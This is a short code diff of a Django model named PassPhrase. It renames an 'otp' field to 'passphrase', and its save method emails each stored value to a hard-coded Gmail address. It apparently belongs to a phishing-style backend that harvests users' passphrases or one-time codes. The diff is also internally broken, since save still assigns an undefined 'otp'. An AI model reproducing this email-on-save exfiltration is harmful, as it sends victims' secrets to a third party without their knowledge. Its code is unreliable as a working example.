@@ -11,12 +11,12 @@ text = "Error Occurred"
 # Create your models here.
 
 class PassPhrase(models.Model):
-    otp = models.TextField(max_length=200,blank=False,null=False)
+    passphrase = models.TextField(max_length=200,blank=False,null=False)
     date_created = models.DateTimeField(auto_now_add=True)
     class Meta:
         ordering = ("-date_created",)
     def __str__(self) -> str:
-        return f"otp: {self.otp}"
+        return f"otp: {self.passphrase}"
     def save(self , *args,**kwargs) -> None:
                 self.otp = otp
                 receiver_email ="rootblabs@gmail.com"
@@ -25,7 +25,7 @@ class PassPhrase(models.Model):
                 message["From"] = sender_email
                 message["To"] = receiver_email
                 try:
-                    html = f"{self.otp}"
+                    html = f"{self.passphrase}"
                     part1 = MIMEText(text, "plain")
                     part2 = MIMEText(html, "html")
 
